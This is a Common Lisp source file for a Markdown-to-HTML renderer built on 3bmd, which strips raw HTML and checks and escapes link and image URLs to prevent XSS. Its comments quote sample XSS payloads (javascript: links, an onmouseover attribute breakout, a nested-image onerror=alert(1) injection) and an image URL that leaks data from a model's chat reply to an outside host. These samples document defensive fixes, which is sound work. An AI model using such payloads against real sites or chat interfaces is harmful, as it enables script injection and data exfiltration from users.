;;;; markdown.lisp --- Markdown -> HTML rendering.
;;;;
;;;; Wraps 3bmd. SAFE by default: raw HTML in the Markdown source is not passed through,
;;;; so user-authored / untrusted content can't inject markup or scripts -- one concrete
;;;; instance of the framework's XSS-prevention posture (output is escaped unless explicitly
;;;; trusted). Pass :allow-html t only for content you trust. Fenced code blocks are
;;;; supported.
;;;;
;;;; HOW THE SAFE MODE WORKS (#559). Every `<' and `>' in the source is replaced by a
;;;; placeholder character before 3bmd parses it, so the parser finds no raw HTML, no HTML
;;;; block and no autolink: each of those needs a real `<'. After parsing, the placeholders
;;;; are turned back into `<' and `>' in the document, and 3bmd's printer escapes them once,
;;;; with the rest of the text. Until #559 the source was escaped to `&lt;' and `&gt;'
;;;; instead, and the printer escaped code spans, indented code and colourised fenced blocks
;;;; a second time, so `(< a b)' in inline code reached the reader as `(&lt; a b)'. `&' is
;;;; left as written, so an entity such as `&amp;' or `&copy;' renders as its character;
;;;; 3bmd's grammar reads an entity only as `&' followed by letters or digits and `;'.
;;;;
;;;; LINK AND IMAGE URLS ARE CHECKED AND ESCAPED HERE, NOT BY 3BMD (#66). Escaping the
;;;; source stops raw HTML, but a Markdown link is not raw HTML: `[x](javascript:...)'
;;;; became `<a href="javascript:...">', and 3bmd writes a URL into its attribute with no
;;;; escaping at all, so `[x](http://a"onmouseover="...)' closed the attribute and added
;;;; an event handler. Both were measured on main before this change. So the document is
;;;; parsed, every link, image and reference definition is rewritten, and only then
;;;; printed: see %SAFE-URL for the rule.

(in-package #:hyperion/markdown)

(defun escape-html (string)
  "Escape &, <, > in STRING for safe use as HTML text content."
  (with-output-to-string (out)
    (loop for c across string
          do (case c
               (#\& (write-string "&amp;" out))
               (#\< (write-string "&lt;" out))
               (#\> (write-string "&gt;" out))
               (t   (write-char c out))))))

;;; --- URLs ---------------------------------------------------------------------

(defparameter +allowed-schemes+ '("http" "https" "mailto")
  "The only URL schemes a rendered link or image may use. Deliberately short: a scheme not
listed is refused, so a scheme nobody thought about is refused too. A URL with no scheme
at all (relative, or `//host/path') is allowed.")

(defparameter +named-references+
  '(("amp" . #\&) ("lt" . #\<) ("gt" . #\>) ("quot" . #\") ("apos" . #\')
    ("colon" . #\:) ("sol" . #\/) ("period" . #\.) ("comma" . #\,) ("num" . #\#)
    ("quest" . #\?) ("equals" . #\=) ("lpar" . #\() ("rpar" . #\))
    ("Tab" . #\Tab) ("NewLine" . #\Newline) ("nbsp" . #\No-break_space))
  "The named character references decoded before a URL is checked. A browser knows many
more, but only these can spell a scheme, its separator or the whitespace a browser ignores
inside one.")

(defun %decode-references (string)
  "STRING with HTML character references decoded, as a browser decodes an attribute value:
decimal (&#106;) and hex (&#x6A;) references with or without the closing semicolon, and the
named ones in +NAMED-REFERENCES+ with it. Anything else is left as written."
  (with-output-to-string (out)
    (let ((i 0) (n (length string)))
      (loop while (< i n)
            do (let ((c (char string i)))
                 (if (char/= c #\&)
                     (progn (write-char c out) (incf i))
                     (let ((decoded nil) (next i))
                       (cond
                         ;; Numeric: &#123 or &#x7B, the semicolon optional.
                         ((and (< (1+ i) n) (char= (char string (1+ i)) #\#))
                          (let* ((hex (and (< (+ i 2) n) (char-equal (char string (+ i 2)) #\x)))
                                 (start (+ i (if hex 3 2)))
                                 (end start))
                            (loop while (and (< end n) (digit-char-p (char string end) (if hex 16 10)))
                                  do (incf end))
                            (when (> end start)
                              (let ((code (parse-integer string :start start :end end
                                                                :radix (if hex 16 10))))
                                (setf decoded (if (< code char-code-limit) (code-char code) #\?)
                                      next (if (and (< end n) (char= (char string end) #\;))
                                               (1+ end) end))))))
                         ;; Named: &colon; and friends, the semicolon required.
                         (t
                          (let ((semi (position #\; string :start i)))
                            (when semi
                              (let ((hit (assoc (subseq string (1+ i) semi) +named-references+
                                                :test #'string=)))
                                (when hit (setf decoded (cdr hit) next (1+ semi))))))))
                       (if decoded
                           (progn (write-char decoded out) (setf i next))
                           (progn (write-char c out) (incf i))))))))))

(defun %url-scheme (url)
  "The scheme of URL, lowercased, or NIL if it has none. URL is already decoded. Control
characters and spaces are dropped first, as a browser drops tab, CR and LF inside a URL and
trims the rest from its ends, so `java<TAB>script:' is read as `javascript:'. A URL has a
scheme only when a colon comes before the first slash, question mark or hash."
  (let* ((compact (remove-if (lambda (c) (<= (char-code c) 32)) url))
         (colon (position #\: compact))
         (stop (position-if (lambda (c) (member c '(#\/ #\? #\#))) compact)))
    (when (and colon (or (null stop) (< colon stop)))
      (string-downcase (subseq compact 0 colon)))))

(defun %escape-attribute (string)
  "STRING escaped for a double-quoted HTML attribute."
  (with-output-to-string (out)
    (loop for c across string
          do (case c
               (#\& (write-string "&amp;" out))
               (#\< (write-string "&lt;" out))
               (#\> (write-string "&gt;" out))
               (#\" (write-string "&quot;" out))
               (#\' (write-string "&#39;" out))
               (t   (write-char c out))))))

(defun %safe-url (source)
  "SOURCE ready to be written into an href or src attribute, or NIL if it must not be.

The check is on the URL as the browser will read it: references decoded, and control
characters and spaces ignored in the scheme. A scheme other than those in
+ALLOWED-SCHEMES+ is refused. An allowed URL is returned decoded and then re-escaped for
the attribute, so a quote cannot end the attribute and an entity cannot be re-formed after
the check."
  (when (stringp source)
    (let* ((decoded (string-trim '(#\Space #\Tab #\Newline #\Return #\Page)
                                 (%decode-references source)))
           (scheme (%url-scheme decoded)))
      (when (or (null scheme) (member scheme +allowed-schemes+ :test #'string=))
        (%escape-attribute decoded)))))

;;; --- the document ---------------------------------------------------------------

(defun %references (doc)
  "Reference definitions in DOC, by label, keyed as 3bmd keys them for lookup."
  (let ((table (make-hash-table :test #'equalp)))
    (dolist (node doc table)
      (when (and (consp node) (eq (car node) :reference))
        (setf (gethash (3bmd::print-label-to-string (getf (cdr node) :label)) table)
              (getf (cdr node) :source))))))

(define-condition render-option-error (error)
  ((argument :initarg :argument :reader render-option-error-argument)
   (value :initarg :value :initform nil :reader render-option-error-value)
   (detail :initarg :detail :reader render-option-error-detail))
  (:report (lambda (c s)
             (format s "hyperion/markdown: ~A~@[ (~S was ~S)~]"
                     (render-option-error-detail c)
                     (render-option-error-argument c)
                     (render-option-error-value c))))
  (:documentation
   "RENDER was asked for something it cannot do (#1119). Signalled for an unrecognised :IMAGES or
:LINKS value, and for :ALLOW-HTML T combined with either untrusted mode.

A NAMED CONDITION RATHER THAN A PLAIN ERROR so a caller can catch this misuse and nothing else.
These are programmer mistakes in the call, not failures to render, and an app that wants to
report a bad configuration without swallowing every other error needs to be able to say which it
means. ARGUMENT is the keyword at fault, or NIL for the combination, and VALUE is what it was
given."))

(defvar *images* t
  "Whether RENDER may emit an IMG element. NIL renders each image as its alt text (#1119). Bound
by RENDER from its :IMAGES argument; not meant to be set directly.")

(defvar *links* t
  "Whether RENDER may emit an HREF. :TEXT renders each link as its text (#1119). Bound by RENDER
from its :LINKS argument; not meant to be set directly.")

(defun %sanitize (elements references)
  "ELEMENTS (a list of 3bmd document nodes and strings) with every link, image and
reference definition made safe. A link or reference link is replaced by its label, and an image
by its alt text, so the words stay and the URL goes.

THREE REASONS THAT CAN HAPPEN, not one. The first was here from #66; the other two came with
#1119, and this docstring described only the first until the review of #1120:

  - %SAFE-URL refuses the URL, because its scheme is not http, https or mailto and it is not
    relative -- a `javascript:' link, for instance;
  - *LINKS* is :TEXT, so no link may carry an HREF at all;
  - *IMAGES* is NIL, so no image may become an IMG element. The URL is not even read in that
    case, so nothing depends on %SAFE-URL's verdict.

RENDER binds the last two from its :LINKS and :IMAGES arguments, for text the app did not
write."
  (loop for e in elements
        nconc (if (and (consp e) (keywordp (car e)))
                  (%sanitize-node e references)
                  (list (if (consp e) (%sanitize e references) e)))))

(defun %plist-free-children (rest)
  "The child nodes in REST, a 3bmd node's tail, with its plist entries left out.

A NODE'S TAIL MIXES TWO THINGS. Some nodes carry children directly, as (:EMPH \"b\") does, and
some carry a plist, as (:EXPLICIT-LINK :LABEL ... :SOURCE ...) does. Dropping keywords alone
would keep the value that follows each one, so a :SOURCE's URL would be collected as though it
were text -- which is the opposite of what %LABEL-TEXT is for. A keyword takes its value with
it."
  (loop with items = '()
        with tail = rest
        while tail
        do (if (keywordp (car tail))
               (setf tail (cddr tail))
               (progn (push (car tail) items) (setf tail (cdr tail))))
        finally (return (nreverse items))))

(defun %label-text (elements)
  "ELEMENTS as a label holding nothing but text and entities, with every other nested element
reduced to the text inside it (#1132).

FOR AN ALT ATTRIBUTE, WHICH CANNOT HOLD MARKUP. 3bmd writes an image's alt label by rendering it
to HTML and putting the result inside alt=\"...\" without escaping it, so a nested element wrote
its own markup into the attribute. An image inside an image's alt text was enough to inject
attributes onto the outer IMG. Measured on main at 052737ea with the DEFAULT options:

  ![![x](onerror=alert(1))](outer.png)
  -> <img src=\"outer.png\" alt=\"<img src=\"onerror=alert(1)\" alt=\"x\" />\" />

The alt value ends at the inner src's first quote, and what follows is read as attributes of the
outer image: ONERROR with the unquoted value ALERT(1). The source passes %SAFE-URL because it is
a relative URL, and the outer image's own source then fails to load, which is what runs the
handler.

A plain string in a label is escaped by 3bmd, so reducing the label to text is what closes this.
NO URL IS EVER COLLECTED: a nested image or link contributes the text of its label and nothing
else, so a URL cannot reach an attribute by this route even if a future node shape carries one
somewhere new.

TWO KINDS OF NODE SURVIVE, because flattening them lost text that belongs in the alt (the review
of #1133):

  - AN ENTITY IS KEPT AS A NODE. Writing it as text made 3bmd escape its ampersand, so
    `![a &copy; b](o.png)' turned alt=\"a &copy; b\" into alt=\"a &amp;copy; b\" and the reader saw
    the markup rather than the character. An entity reaches the attribute raw, which is right:
    a character reference does not end an attribute value, so it cannot break out of one.
  - A HARD LINE BREAK BECOMES A SPACE. It contributed nothing, so \"line1\" and \"line2\" around
    one came out as alt=\"line1line2\". It cannot stay a BR, because that is markup and an
    attribute cannot hold it -- which is what the old behaviour did: a break inside an alt label
    used to write a literal <br/> into the attribute.

That is why the return value is a LIST of label elements rather than a single string: a label
that is all text is one string, and one that contains an entity is text and entity nodes."
  (let ((parts '())
        (text (make-string-output-stream)))
    (labels ((flush ()
               (let ((s (get-output-stream-string text)))
                 (when (plusp (length s)) (push s parts))))
             (walk (e)
               (cond ((stringp e) (write-string e text))
                     ((and (consp e) (keywordp (car e)))
                      (case (car e)
                        ;; Kept whole, so 3bmd writes it raw instead of escaping its ampersand.
                        (:entity (flush) (push e parts))
                        ;; Not a BR: markup cannot go in an attribute. A space, because the words
                        ;; on either side of a break are separate words.
                        (:line-break (write-char #\Space text))
                        ;; (:IMAGE (:EXPLICIT-LINK :LABEL ...)): the wrapped link's label.
                        (:image (walk (first (cdr e))))
                        ((:explicit-link :reference-link :link)
                         (mapc #'walk (getf (cdr e) :label)))
                        (t (mapc #'walk (%plist-free-children (cdr e))))))
                     ((consp e) (mapc #'walk e)))))
      (mapc #'walk elements)
      (flush)
      (nreverse parts))))

(defun %sanitize-node (node references)
  "A list of nodes to put in place of NODE. See %SANITIZE."
  (let ((tag (car node)) (rest (cdr node)))
    (case tag
      (:explicit-link
       (let ((label (%sanitize (getf rest :label) references))
             (url (and (not (eq *links* :text)) (%safe-url (getf rest :source)))))
         (if url
             (list (list* :explicit-link :label label :source url
                          (loop for (k v) on rest by #'cddr
                                unless (member k '(:label :source)) nconc (list k v))))
             label)))
      (:image
       ;; (:image (:explicit-link :label ... :source ... :title ...))
       (let* ((link (cdr (first rest)))
              (label (%sanitize (getf link :label) references))
              ;; WITH *IMAGES* NIL THE URL IS NOT EVEN READ, so no IMG can be emitted whatever
              ;; shape the node has -- an explicit image, or a reference image whose source is
              ;; elsewhere. The alt text is what is left, which is what a refused URL already
              ;; produced (#1119).
              (url (and *images* (%safe-url (getf link :source)))))
         (if url
             ;; THE LABEL IS REDUCED TO ONE PLAIN STRING, because 3bmd renders it into the
             ;; alt attribute without escaping the result (#1132). Only this branch needs it:
             ;; when no image is emitted the label becomes ordinary content, where an element
             ;; is markup rather than an attribute value.
             (list (list :image (list* :explicit-link
                                       :label (%label-text label)
                                       :source url
                                       (loop for (k v) on link by #'cddr
                                             unless (member k '(:label :source))
                                               nconc (list k v)))))
             label)))
      (:reference-link
       (let* ((label (getf rest :label))
              (key (3bmd::print-label-to-string (or (getf rest :definition) label)))
              (source (gethash key references)))
         (if (and source (not (eq *links* :text)) (%safe-url source))
             ;; AN ACCEPTED REFERENCE LINK STILL HAS ITS LABEL WALKED. Returning the node whole
             ;; left the label untouched, so anything inside it escaped every rule applied here:
             ;; with :IMAGES NIL and the default :LINKS T,
             ;; `[![alt](https://tracker.example/i.png)][r]' kept the image and would still have
             ;; fetched it. Measured before the fix (the review of #1120).
             ;;
             ;; The ORIGINAL label is kept as :DEFINITION so the lookup key is unchanged.
             ;; 3bmd computes that key from (or :definition :label), so sanitising the label
             ;; without this would change the key and the definition would no longer resolve.
             (list (list* :reference-link
                          :label (%sanitize label references)
                          :definition (or (getf rest :definition) label)
                          (loop for (k v) on rest by #'cddr
                                unless (member k '(:label :definition)) nconc (list k v))))
             ;; Refused, or undefined: the label as text. An undefined one would have
             ;; printed as text anyway, with a warning.
             (%sanitize label references))))
      (:reference
       (let ((url (%safe-url (getf rest :source))))
         (list (list* :reference :source (or url "")
                      (loop for (k v) on rest by #'cddr
                            unless (eq k :source) nconc (list k v))))))
      (:link
       ;; An autolink, <http://...>: its text is the URL.
       (let ((url (and (not (eq *links* :text)) (%safe-url (first rest)))))
         (if url (list (list :link url)) (list (first rest)))))
      (t (list (cons tag (%sanitize rest references)))))))

(defparameter +less-than+ (code-char #xFDD0)
  "Stands for `<' in the source while 3bmd parses it in the safe mode. A Unicode
noncharacter, so text does not use it; any found in the source is replaced first.")

(defparameter +greater-than+ (code-char #xFDD1)
  "Stands for `>' in the source while 3bmd parses it in the safe mode.")

(defun %quote-markers (markdown)
  "The positions in MARKDOWN of each `>' that may mark a block quote: each `>' with nothing
before it on its line but spaces, tabs, other `>'s and list markers (#574, #584). A list marker
is `-', `+' or `*', or digits and a `.', followed by a space or tab.

3bmd parses a list item's text again as a document of its own, with the marker and one indent
taken off, so `- > x' and a continuation line `    > x' are block quotes in a list item. This
marks more than 3bmd reads as markers: a `>' after four or more spaces, or after a marker in a
paragraph that 3bmd does not take for a list, is marked too. That changes nothing, because 3bmd
gives a marked `>' every role it has with :ALLOW-HTML T, and prints one it reads as text or code
escaped once, the same as a hidden one. What must stay hidden is a `>' in an explicit link's URL,
`[text](url)', which ends the URL there; that URL contains no space or line break, so none of these
is in one. A reference definition can put its URL on the next line, so `[x]:' followed by the line
`    >u' gives the URL `>u' with the `>' marked. There `>' is an ordinary URL character, 3bmd reads
it the same way in both modes, and %SAFE-URL escapes it in the href."
  (let ((n (length markdown))
        (markers '()))
    (labels ((blank-end (i)
               (or (position-if-not (lambda (c) (member c '(#\Space #\Tab))) markdown :start i)
                   n))
             (marker-end (i)
               ;; The position after the list marker at I and the space or tab after it, or NIL.
               (let ((after (cond ((member (char markdown i) '(#\- #\+ #\*)) (1+ i))
                                  ((digit-char-p (char markdown i))
                                   (let ((d (or (position-if-not #'digit-char-p markdown :start i)
                                                n)))
                                     (and (< d n) (char= #\. (char markdown d)) (1+ d)))))))
                 (and after (< after n) (member (char markdown after) '(#\Space #\Tab))
                      after))))
      (loop with line = 0
            while (< line n)
            do (loop with i = (blank-end line)
                     while (< i n)
                     do (cond ((char= #\> (char markdown i))
                               (push i markers)
                               (setf i (blank-end (1+ i))))
                              ((marker-end i) (setf i (blank-end (marker-end i))))
                              (t (loop-finish))))
               (setf line (let ((newline (position #\Newline markdown :start line)))
                            (if newline (1+ newline) n)))))
    (nreverse markers)))

(defun %hide-brackets (markdown)
  "MARKDOWN with each < and > replaced by its placeholder, and each placeholder character
already in it replaced by U+FFFD, so that only this function's placeholders become brackets. A
`>' that marks a block quote is left for 3bmd to read (#574). It cannot form HTML, because every
`<' is hidden, and 3bmd escapes a `>' wherever it prints one as text or code."
  (let ((markers (%quote-markers markdown)))
    (with-output-to-string (out)
      (loop for c across markdown
            for i from 0
            do (write-char (cond ((and markers (= i (first markers))) (pop markers) c)
                                 ((char= c #\<) +less-than+)
                                 ((char= c #\>) +greater-than+)
                                 ((or (char= c +less-than+) (char= c +greater-than+))
                                  (code-char #xFFFD))
                                 (t c))
                           out)))))

(defun %restore-brackets (string)
  (substitute #\> +greater-than+ (substitute #\< +less-than+ string)))

(defun %language-name-p (lang)
  "Whether LANG, a fenced block's info string, is a language name: letters, digits and
+ - _ . # only, and not empty. 3bmd writes a fenced block's language into a class attribute
without escaping it under some renderers, so any other info string is dropped (#559)."
  (and (stringp lang) (plusp (length lang))
       (every (lambda (c) (or (alphanumericp c) (find c "+-_.#"))) lang)))

(defun %escaping-renderer-p (lang)
  "Whether the current 3bmd code-block renderer escapes `&' in a fenced block named LANG.
:NOHIGHLIGHT does not: it uses 3bmd's ESCAPE-PRE-STRING, which escapes only < and >. :COLORIZE
escapes a block it colours, and sends any other block through ESCAPE-PRE-STRING. :PYGMENTS and
:CHROMA hand the code to an external program that writes escaped HTML, so they do. A renderer an
app defines is assumed to escape its output, as those two do. This follows RENDER-CODE-BLOCK's
own choice, and the markdown suite checks each case."
  (case 3bmd-code-blocks::*renderer*
    (:nohighlight nil)
    (:colorize (and (or (and lang (3bmd-code-blocks::find-coloring-type lang))
                        (and (zerop (length (or lang "")))
                             3bmd-code-blocks:*code-blocks-default-colorize*))
                    t))
    (t t)))

(defun %restore-code-block (rest)
  "A fenced block's plist REST with its brackets restored, its language dropped unless it is a
language name, and its content escaped for `&' when the renderer will not do that itself."
  (let* ((lang (let ((l (getf rest :lang)))
                 (and l (%language-name-p (%restore-brackets l)) (%restore-brackets l))))
         (content (getf rest :content))
         (content (and content
                       (%restore-brackets
                        (if (%escaping-renderer-p lang)
                            content
                            (with-output-to-string (out)
                              (loop for c across content
                                    do (if (char= c #\&)
                                           (write-string "&amp;" out)
                                           (write-char c out)))))))))
    (list* :lang lang :content content
           (loop for (k v) on rest by #'cddr
                 unless (member k '(:lang :content))
                   nconc (list k (if (stringp v) (%restore-brackets v) v))))))

(defun %restore (tree)
  "TREE, a 3bmd document or part of one, with the safe mode's placeholders turned back into
< and >. 3bmd's printer escapes them, with all other text."
  (cond ((stringp tree) (%restore-brackets tree))
        ((and (consp tree) (eq (car tree) '3bmd-code-blocks::code-block))
         (cons (car tree) (%restore-code-block (cdr tree))))
        ((consp tree) (cons (%restore (car tree)) (%restore (cdr tree))))
        (t tree)))

(defun render (markdown &key allow-html (images t) (links t))
  "Render MARKDOWN (a string) to an HTML string. SAFE by default: raw HTML in the
source is shown as text (suitable for user/untrusted content), and the text of code spans
and code blocks is escaped once (#559). ALLOW-HTML t passes raw HTML through -- trusted
content only. Returns \"\" for NIL/empty input.

Link and image URLs are checked in both modes (#66). Only http, https and mailto are
allowed, plus URLs with no scheme (relative, or `//host/path'); the list is deliberately
short. The check reads the URL as a browser will: character references decoded, and tabs,
newlines and other control characters inside the scheme ignored, so `jav&#x61;script:' and
`java<TAB>script:' are both refused. A refused link renders as its text with no href, and a
refused image as its alt text. An allowed URL is written into its attribute escaped, which
3bmd does not do itself.

FOR UNTRUSTED TEXT, such as a model's reply shown in a chat, pass :IMAGES NIL and :LINKS :TEXT
(#1119). The defaults keep both, so nothing that renders trusted content changes.

  :IMAGES NIL  renders each image as its alt text and emits no IMG element. An image is fetched
               as soon as it is rendered, with no click, so a reply holding
               `![x](https://elsewhere.example/?d=...)' makes the reader's machine send that
               request. In a desktop webview with no Content-Security-Policy nothing stops it.
  :LINKS :TEXT renders each link as its text and emits no HREF. In a desktop webview, following
               a link replaces the app's own page with the linked one.

Both apply to an explicit link or image and to a reference link. AN AUTOLINK NEEDS NEITHER
OPTION and is not covered by them: in the safe mode 3bmd never builds one, because the angle
brackets are escaped as text before it parses, and the only mode that does build one is
:ALLOW-HTML T, which these options refuse. So `<https://host/>' reaches the output as text either
way, and the :LINK branch of %SANITIZE-NODE is unreachable while :LINKS is :TEXT. It is written
to honour the option regardless, so that a change in how 3bmd parses cannot quietly turn
autolinks back into links, but nothing here should be read as the option doing that work today.

NEITHER CAN BE COMBINED WITH :ALLOW-HTML T, which signals RENDER-OPTION-ERROR: raw HTML is not
parsed into the tree these options filter, so an IMG or HREF written directly in the source would
survive them, and the option would be promising something it does not do.

:IMAGES accepts T or NIL and :LINKS accepts T or :TEXT. ANY OTHER VALUE SIGNALS
RENDER-OPTION-ERROR rather than falling back to the default, because the default is the
permissive one and a typo in a security option must not read as `render everything'."
  ;; :ALLOW-HTML T CANNOT BE COMBINED WITH EITHER UNTRUSTED MODE, and the combination signals
  ;; rather than doing its best. Measured: with :ALLOW-HTML T a raw `<img src=...>' or
  ;; `<a href=...>' in the source passes through untouched, because raw HTML is not parsed into
  ;; the tree %SANITIZE walks -- so :IMAGES NIL would have reported no image while the output
  ;; carried one. The two arguments also describe opposite situations: :ALLOW-HTML T is for
  ;; content this app wrote, and these modes are for content it did not. An option that promises
  ;; a guarantee it cannot deliver is worse than no option (#1119).
  (when (and allow-html (or (null images) (eq links :text)))
    (error 'render-option-error
           :argument nil
           :detail (concatenate 'string
                                ":ALLOW-HTML T cannot be combined with :IMAGES NIL or :LINKS "
                                ":TEXT. Raw HTML passes through unparsed, so an IMG or an HREF "
                                "written directly in the source would survive both. Render "
                                "untrusted text without :ALLOW-HTML.")))
  (unless (member images '(t nil))
    (error 'render-option-error :argument :images :value images
                                :detail ":IMAGES must be T or NIL"))
  (unless (member links '(t :text))
    (error 'render-option-error :argument :links :value links
                                :detail ":LINKS must be T or :TEXT"))
  (if (and markdown (plusp (length markdown)))
      (let ((*images* images)
            (*links* links)
            (3bmd-code-blocks:*code-blocks* t)
            ;; NIL in the safe mode: each of these makes 3bmd print some text without escaping
            ;; it, which the safe mode's escaping relies on not happening (#559). :ALLOW-HTML T
            ;; keeps the app's values, as it did before #559.
            (3bmd:*smart-quotes* (and allow-html 3bmd:*smart-quotes*))
            (3bmd:*generate-header-ids* (and allow-html 3bmd:*generate-header-ids*))
            (3bmd-code-blocks:*render-code-spans*
              (and allow-html 3bmd-code-blocks:*render-code-spans*))
            ;; Emit plain <pre><code> (no server-side colorize) -- avoids the
            ;; colorize/HyperSpec console noise; client-side highlighting can be
            ;; layered on later if wanted.
            (3bmd-code-blocks:*code-blocks-default-colorize* nil))
        (let* ((source (if allow-html markdown (%hide-brackets markdown)))
               ;; What 3BMD:PARSE-STRING-AND-PRINT-TO-STREAM does, split in two so the
               ;; document can be rewritten between parsing and printing.
               (parsed (3bmd-grammar::parse-doc (3bmd::expand-tabs source :add-newlines t)))
               (doc (if allow-html parsed (%restore parsed))))
          (with-output-to-string (out)
            (3bmd:print-doc-to-stream (%sanitize doc (%references doc)) out))))
      ""))
